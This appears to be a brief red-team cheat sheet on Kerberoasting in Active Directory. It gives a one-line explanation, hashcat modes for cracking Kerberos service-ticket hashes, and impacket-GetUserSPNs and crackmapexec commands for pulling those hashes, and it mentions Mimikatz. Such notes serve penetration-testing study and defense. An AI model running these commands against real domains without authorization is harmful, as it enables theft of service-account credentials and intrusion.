# Kerberoasting
Kerberoasting takes advantage of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs). By default, all standard domain users can request a copy of all service accounts ST (with SPN value set) along with their correlating password hashes.

hashcat -m 13100 etype 23
hashcat -m 19600 etype 17
hashcat -m 19700 etype 18

`impacket-GetUserSPNs -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>'`

`impacket-GetUserSPNs -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -outputfile kerb.hash`

`crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --kerberoasting <OUTPUT.TXT>`

`Mimikatz`